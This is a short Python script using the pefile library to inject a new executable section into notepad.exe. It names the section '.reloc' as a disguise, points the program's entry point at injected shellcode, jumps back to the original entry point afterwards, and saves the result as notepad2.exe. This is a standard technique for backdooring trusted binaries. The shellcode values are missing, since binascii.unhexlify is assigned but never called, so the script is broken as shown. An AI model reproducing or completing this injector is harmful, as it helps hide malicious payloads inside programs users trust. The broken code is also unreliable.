import pefile
import binascii


def adjust_SectionSize(sz, align):
    if sz % align:
        sz = ((sz + align) // align) * align
    return sz


pe = pefile.PE('notepad.exe')
last_section = pe.sections[-1]

new_section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)

# fill with zeros
new_section.__unpack__(bytearray(new_section.sizeof()))

# place section header after last section header (assume there is enough room)
new_section.set_file_offset(
    last_section.get_file_offset() + last_section.sizeof())

new_section.Name = b'.reloc'
new_section_size = 3000

new_section.SizeOfRawData = adjust_SectionSize(
    new_section_size, pe.OPTIONAL_HEADER.FileAlignment)
new_section.PointerToRawData = len(pe.__data__)

new_section.Misc = new_section.Misc_PhysicalAddress = new_section.Misc_VirtualSize = new_section_size
new_section.VirtualAddress = last_section.VirtualAddress + \
    adjust_SectionSize(last_section.Misc_VirtualSize,
                       pe.OPTIONAL_HEADER.SectionAlignment)

new_section.Characteristics = 0x40000000 | 0x20000000 | 0x20  # read | execute | code
# create new section data containing jump to OEP
# 4DC645E9
shellCode_part_one = binascii.unhexlify

shellCode_part_two = binascii.unhexlify

shellCode_jmp_oldEntryPoint = bytearray(4)
shellCode_jmp_oldEntryPoint[0] = 0xe9
shellCode_jmp_oldEntryPoint[1:4] = (pe.OPTIONAL_HEADER.AddressOfEntryPoint -
                                    (new_section.VirtualAddress + 5+int(len(shellCode_part_one)))).to_bytes(4,
                                                                                                            byteorder='little', signed=True)

shellCode_null = bytearray(
    new_section.SizeOfRawData - len(shellCode_part_one) - len(shellCode_part_two) - 5)


# change address of entry point to beginning of new section
pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_section.VirtualAddress

# increase size of image
pe.OPTIONAL_HEADER.SizeOfImage += adjust_SectionSize(
    new_section_size, pe.OPTIONAL_HEADER.SectionAlignment)

# increase number of sections
pe.FILE_HEADER.NumberOfSections += 1

# append new section to structures
pe.sections.append(new_section)
pe.__structures__.append(new_section)

# add new section data to file
pe.__data__ = bytearray(pe.__data__) +\
    shellCode_part_one+shellCode_jmp_oldEntryPoint + \
    shellCode_part_two+shellCode_null
pe.write('notepad2.exe')
